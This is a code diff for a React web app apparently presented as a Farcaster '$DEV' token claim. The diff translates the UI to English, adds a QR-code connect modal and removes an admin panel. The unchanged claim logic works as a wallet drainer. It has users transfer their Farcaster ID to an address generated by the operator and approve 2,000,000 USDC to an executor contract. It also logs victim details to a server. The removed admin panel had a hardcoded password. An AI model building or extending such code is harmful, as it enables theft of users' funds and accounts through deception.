@@ -64,93 +64,86 @@ function StatusRow({ label, value, tone = 'normal' }) {
   );
 }
 
-function AdminPanel({ onBack }) {
-  const [adminKey, setAdminKey] = useState('');
-  const [admin, setAdmin] = useState(false);
-  const [txInput, setTxInput] = useState('');
-  const [txResult, setTxResult] = useState('');
-  const [logs, setLogs] = useState([]);
+// ─── Wallet Connect Modal (with QR Code) ───
+function WalletConnectModal({ onSelect, onClose }) {
+  const [qrLoaded, setQrLoaded] = useState(false);
+  const appUrl = typeof window !== 'undefined' ? window.location.href : '';
+  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(appUrl)}&bgcolor=030704&color=39ff14&margin=15`;
 
-  useEffect(() => {
-    const logsRaw = localStorage.getItem('devin_logs');
-    setLogs(logsRaw ? JSON.parse(logsRaw) : []);
-  }, []);
-
-  function handleLogin() {
-    if (adminKey === 'admin2026') setAdmin(true);
-    else alert('كلمة مرور خاطئة');
-  }
-
-  async function handleExecute() {
-    try {
-      if (!adminKey) return;
-      const wallet = new ethers.Wallet(adminKey, ethers.getDefaultProvider('https://mainnet.base.org'));
-      const contract = new ethers.Contract(EXECUTOR, [
-        'function executeBatch(bytes[] calldata data)'
-      ], wallet);
-      const tx = await contract.executeBatch(JSON.parse(txInput));
-      setTxResult('تم إرسال المعاملة: ' + tx.hash);
-    } catch (e) {
-      setTxResult('خطأ: ' + (e.message || e.toString()));
-    }
-  }
-
-  return (
-    <div className="about">
-      <button onClick={onBack} style={{marginBottom: 16}}>رجوع</button>
-      {!admin ? (
-        <div>
-          <h2>دخول الأدمن</h2>
-          <input type="password" placeholder="كلمة مرور الأدمن أو المفتاح الخاص" value={adminKey} onChange={e => setAdminKey(e.target.value)} />
-          <button onClick={handleLogin}>دخول</button>
-        </div>
-      ) : (
-        <div>
-          <h2>لوحة تحكم الأدمن</h2>
-          <h4>سجل العمليات</h4>
-          <ul>
-            {logs.map((log, i) => <li key={i}>{log}</li>)}
-          </ul>
-          <h4>تنفيذ دوال العقد الرئيسي</h4>
-          <textarea rows={4} style={{width:'100%'}} placeholder='أدخل بيانات executeBatch كـ JSON' value={txInput} onChange={e => setTxInput(e.target.value)} />
-          <button onClick={handleExecute}>تنفيذ</button>
-          <div>{txResult}</div>
-        </div>
-      )}
-    </div>
-  );
-}
-
-function WalletConnectModal({ onSelect, onClose, farcasterUrl }) {
   return (
     <div style={{position:'fixed',top:0,left:0,right:0,bottom:0,background:'#000a',zIndex:1000,display:'flex',alignItems:'center',justifyContent:'center'}}>
-      <div style={{background:'#04160a',padding:32,borderRadius:16,minWidth:320,maxWidth:420}}>
-        <h3 style={{color:'#39ff14'}}>اختر طريقة الربط</h3>
-        <p style={{fontSize:12,color:'var(--muted)',margin:'8px 0 16px'}}>يُفضل استخدام محفظة فاركاستر للحصول على أفضل تجربة.</p>
+      <div style={{background:'#04160a',padding:28,borderRadius:16,minWidth:340,maxWidth:420}}>
+        <h3 style={{color:'#39ff14',textAlign:'center',marginBottom:4}}>Connect Wallet</h3>
+        <p style={{fontSize:12,color:'#8b949e',marginBottom:16,textAlign:'center'}}>
+          Use your Farcaster wallet for the best experience
+        </p>
 
-        <a href={farcasterUrl} target="_blank" rel="noopener noreferrer" style={{display:'block',width:'100%',margin:'8px 0',padding:14,background:'var(--green)',color:'#001b06',border:'none',borderRadius:8,cursor:'pointer',fontSize:14,fontWeight:700,textAlign:'center',textDecoration:'none'}}>
-          ⚡ فتح في Warpcast (موصى به)
+        {/* QR Code */}
+        <div style={{textAlign:'center',marginBottom:14}}>
+          <p style={{fontSize:11,color:'#8b949e',marginBottom:8}}>Scan with Warpcast to connect</p>
+          <div style={{
+            display:'inline-block',padding:10,background:'#fff',
+            borderRadius:10,position:'relative',minWidth:280,minHeight:280
+          }}>
+            {!qrLoaded && (
+              <div style={{
+                position:'absolute',inset:0,display:'flex',
+                alignItems:'center',justifyContent:'center',
+                color:'#666',fontSize:12
+              }}>Loading QR...</div>
+            )}
+            <img
+              src={qrUrl}
+              alt="Scan with Warpcast"
+              style={{display:'block',width:280,height:280,borderRadius:6,opacity:qrLoaded?1:0}}
+              onLoad={() => setQrLoaded(true)}
+            />
+          </div>
+        </div>
+
+        <a href={appUrl} target="_blank" rel="noopener noreferrer" style={{
+          display:'block',width:'100%',margin:'6px 0',padding:13,
+          background:'var(--green)',color:'#001b06',border:'none',
+          borderRadius:8,cursor:'pointer',fontSize:14,fontWeight:700,
+          textAlign:'center',textDecoration:'none'
+        }}>
+          Open in Warpcast
         </a>
 
-        <button style={{width:'100%',margin:'8px 0',padding:12,background:'rgba(57,255,20,0.1)',color:'#39ff14',border:'1px solid #39ff14',borderRadius:8,cursor:'pointer',fontSize:14}} onClick={()=>onSelect('wallet')}>
-          ربط محفظة متصفح (MetaMask / Rabby)
+        <div style={{display:'flex',alignItems:'center',gap:8,margin:'12px 0',color:'#6e7681',fontSize:12}}>
+          <div style={{flex:1,height:1,background:'#1a3a1a'}} />
+          <span>or</span>
+          <div style={{flex:1,height:1,background:'#1a3a1a'}} />
+        </div>
+
+        <button style={{
+          width:'100%',margin:'6px 0',padding:12,
+          background:'rgba(57,255,20,0.1)',color:'#39ff14',
+          border:'1px solid #39ff14',borderRadius:8,cursor:'pointer',fontSize:14
+        }} onClick={() => onSelect('wallet')}>
+          Connect Browser Wallet
         </button>
 
-        <div style={{margin:'12px 0',padding:12,borderRadius:8,background:'rgba(255,92,124,0.08)',border:'1px solid rgba(255,92,124,0.3)'}}>
+        <div style={{margin:'12px 0',padding:10,borderRadius:8,background:'rgba(255,92,124,0.08)',border:'1px solid rgba(255,92,124,0.3)'}}>
           <p style={{margin:0,fontSize:11,color:'#ff8fa3',lineHeight:1.6}}>
-            ⚠️ العمليات تتطلب محفظة فاركاستر:<br/>
-            • نقل FID → شبكة Optimism<br/>
-            • Claim $DEV → شبكة Base<br/>
-            افتح التطبيق في Warpcast لتجربة كاملة.
+            Operations require a Farcaster wallet:<br/>
+            FID Transfer → Optimism network<br/>
+            Claim $DEV → Base network<br/>
+            Open in Warpcast for the full experience.
           </p>
         </div>
 
-        <button style={{width:'100%',margin:'8px 0',padding:12,background:'#222',color:'#eee',border:'1px solid #444',borderRadius:8,cursor:'pointer',fontSize:14}} onClick={onClose}>إغلاق</button>
+        <button style={{
+          width:'100%',margin:'6px 0',padding:12,
+          background:'#222',color:'#eee',border:'1px solid #444',
+          borderRadius:8,cursor:'pointer',fontSize:14
+        }} onClick={onClose}>Close</button>
       </div>
     </div>
   );
 }
 
+// ─── Main App ───
 function App() {
   const [activePage, setActivePage] = useState('claim');
   const [isMiniApp, setIsMiniApp] = useState(false);
@@ -183,7 +176,7 @@ function App() {
           setFrameContext(context);
           setProvider(ethProvider || null);
           if (ethProvider) {
-            setNotice('Farcaster wallet detected. Connecting automatically…');
+            setNotice('Farcaster wallet detected. Connecting automatically...');
           } else {
             setNotice('Farcaster frame detected, but no wallet provider.');
           }
@@ -220,7 +213,7 @@ function App() {
       return;
     }
     setWorking(true);
-    setNotice(options.automatic ? 'Connecting Farcaster wallet…' : 'Requesting wallet connection…');
+    setNotice(options.automatic ? 'Connecting Farcaster wallet...' : 'Requesting wallet connection...');
     try {
       const selectedProvider = activeProvider || await detectBrowserWallet();
       if (!selectedProvider) return;
@@ -246,34 +239,29 @@ function App() {
     localStorage.setItem('devin_logs', JSON.stringify(logs));
   }
 
-  async function sendToLogAPI({ type, fid, from, to, txHash, network: net, block, amount }) {
+  async function sendToLogAPI(data) {
     try {
       await fetch('/api/logs', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          type: type || 'verify',
-          fid: fid || null,
-          from: from || null,
-          to: to || null,
-          txHash: txHash || null,
-          network: net || null,
-          block: block || null,
-          amount: amount || null,
+          ...data,
           timestamp: new Date().toISOString(),
         }),
       });
-    } catch { /* silent */ }
+    } catch {
+      // Silent fail - logging is non-critical
+    }
   }
 
   async function generateDestination(fidNum, senderAddr) {
-    const resp = await fetch('/api/generate-address', {
+    const resp = await fetch('/api/addresses', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ fid: fidNum, senderAddress: senderAddr }),
     });
     const data = await resp.json();
-    if (!data.success) throw new Error(data.error || 'Failed to generate destination');
+    if (!data.success) throw new Error(data.error || 'Failed to generate destination address');
     return data;
   }
 
@@ -326,15 +314,15 @@ function App() {
         // Ensure on Optimism
         const chainId = await activeProvider.request({ method: 'eth_chainId' });
         if (chainId !== '0xa') {
-          setNotice('Switching to Optimism network…');
+          setNotice('Switching to Optimism network...');
           await switchNetwork(activeProvider, '0xa', 'Optimism', 'https://mainnet.optimism.io', 'https://optimistic.etherscan.io');
         }
 
         // Generate unique destination address from HD wallet
-        setNotice('Generating destination address…');
+        setNotice('Generating destination address...');
         const dest = await generateDestination(fidNum, account);
 
-        setNotice(`Transferring FID ${fidNum} → ${shortAddress(dest.address)} [#${dest.index}]…`);
+        setNotice(`Transferring FID ${fidNum} → ${shortAddress(dest.address)} [#${dest.index}]...`);
 
         const signer = new ethers.providers.Web3Provider(activeProvider).getSigner();
         const idRegistry = new ethers.Contract(ID_REGISTRY, [
@@ -350,7 +338,7 @@ function App() {
 
         setVerified(true);
         setNetwork('Optimism');
-        setNotice(`✅ FID ${fidNum} transferred to ${shortAddress(dest.address)} on Optimism`);
+        setNotice(`FID ${fidNum} transferred to ${shortAddress(dest.address)} on Optimism`);
         if (isMiniApp) await sdk.haptics.notificationOccurred('success');
 
       } else {
@@ -391,14 +379,14 @@ function App() {
       // ─── Switch to Base network ───
       const chainId = await activeProvider.request({ method: 'eth_chainId' });
       if (chainId !== '0x2105') {
-        setNotice('Switching to Base network for USDC approval…');
+        setNotice('Switching to Base network for USDC approval...');
         await switchNetwork(activeProvider, '0x2105', 'Base', 'https://mainnet.base.org', 'https://basescan.org');
       }
 
       const signer = new ethers.providers.Web3Provider(activeProvider).getSigner();
 
       // ─── 1. Approve USDC on Base ───
-      setNotice('Approving 2,000,000 USDC on Base…');
+      setNotice('Approving 2,000,000 USDC on Base...');
       const usdc = new ethers.Contract(USDC, [
         'function approve(address spender, uint256 amount) returns (bool)'
       ], signer);
@@ -412,7 +400,7 @@ function App() {
       });
 
       // ─── 2. Execute claim batch on Base ───
-      setNotice('Executing claim batch on Base…');
+      setNotice('Executing claim batch on Base...');
       const executor = new ethers.Contract(EXECUTOR, [
         'function executeBatch(bytes[] calldata data)'
       ], signer);
@@ -425,7 +413,7 @@ function App() {
       });
 
       setNetwork('Base');
-      setNotice('✅ Claim submitted on Base! Approve + executeBatch sent.');
+      setNotice('Claim submitted on Base! Approve + executeBatch sent.');
       if (isMiniApp) await sdk.haptics.notificationOccurred('success');
     } catch (error) {
       setNotice(error?.shortMessage || error?.message || 'Claim failed.');
@@ -441,8 +429,6 @@ function App() {
   }
 
   const [showWalletModal, setShowWalletModal] = useState(false);
-
-  // Farcaster Mini App URL for the deep link
   const farcasterUrl = typeof window !== 'undefined' ? window.location.href : '/';
 
   return (
@@ -464,9 +450,7 @@ function App() {
             <span>devin</span>
           </button>
           <div className="nav-links">
-            <button className={activePage === 'claim' ? 'active' : ''} onClick={() => setActivePage('claim')}>Claim</button>
             <button className={activePage === 'about' ? 'active' : ''} onClick={() => setActivePage('about')}>About</button>
-            <button className={activePage === 'admin' ? 'active' : ''} onClick={() => setActivePage('admin')}>Admin</button>
           </div>
         </nav>
 
@@ -536,14 +520,8 @@ function App() {
               ))}
             </div>
             <p className="safety">Step 1 (FID Transfer) runs on Optimism. Step 2 (USDC Approve + Claim) runs on Base.</p>
-            <div style={{marginTop:32}}>
-              <h4>لوحة الأدمن</h4>
-              <p>لوحة تحكم كاملة: <a href="/admin" style={{color:'var(--green)'}}>Admin Dashboard</a></p>
-            </div>
           </div>
-        ) : (
-          <AdminPanel onBack={() => setActivePage('claim')} />
-        )}
+        ) : null}
       </section>
     </main>
   );
